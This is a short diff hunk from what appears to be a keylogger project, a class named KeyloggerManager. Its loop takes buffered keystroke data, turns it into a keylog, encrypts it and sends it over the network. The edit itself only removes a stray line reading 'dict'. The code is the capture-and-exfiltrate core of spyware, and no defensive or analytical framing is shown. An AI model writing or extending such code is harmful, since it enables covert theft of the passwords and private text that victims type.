@@ -28,7 +28,6 @@ class KeyloggerManager:
                 buffer_data = self.service.get_buffer_data()
                 if buffer_data:
                     key_log = self.dictWriter.process_keylog(buffer_data)
-                    dict
                     encrypted_logs = self.encryption.encrypt(str(key_log))
                     self.writerNetwork.send_data(encrypted_logs)
                 self.last_buffer_send = current_time
